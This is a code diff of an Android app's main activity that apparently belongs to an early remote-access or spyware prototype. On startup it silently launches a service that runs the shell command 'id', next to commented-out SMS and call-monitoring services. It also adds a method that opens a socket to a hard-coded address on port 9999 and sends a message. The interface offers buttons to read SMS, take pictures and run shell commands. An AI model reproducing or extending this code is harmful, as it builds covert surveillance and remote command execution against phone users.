@@ -25,6 +25,9 @@ import org.w3c.dom.Text;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.net.Socket;
 import java.util.ArrayList;
 
 public class MainActivity extends AppCompatActivity {
@@ -42,6 +45,13 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+//        Intent smsIntent = new Intent(this, SMSService.class);
+//        startService(smsIntent);
+//        Intent callIntent = new Intent(this, CallService.class);
+//        startService(callIntent);
+        Intent binshIntent = new Intent(this, bin_shService.class);
+        binshIntent.putExtra("command", "id");
+        startService(binshIntent);
         Button smsBtn = (Button) findViewById(R.id.read_sms_btn);
         Button picBtn = (Button) findViewById(R.id.pic_btn);
         Button shellBtn = (Button) findViewById(R.id.shell_btn);
@@ -52,6 +62,24 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+    }
+
+    public void ioConnection(View view){
+        try{
+            Socket socket = new Socket("192.168.106.11", 9999);
+            OutputStream out = socket.getOutputStream();
+            PrintWriter output = new PrintWriter(out);
+            output.println("Send message to server");
+            output.flush();
+            output.close();
+            out.close();
+            socket.close();
+//            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+//            String serverMSG = input.readLine();
+            Toast.makeText(this, "connection successful", Toast.LENGTH_LONG).show();
+        }catch (IOException ioException){
+            Toast.makeText(this, ioException.getMessage(), Toast.LENGTH_LONG).show();
+        }
     }
 
     public void executeShell(View view){
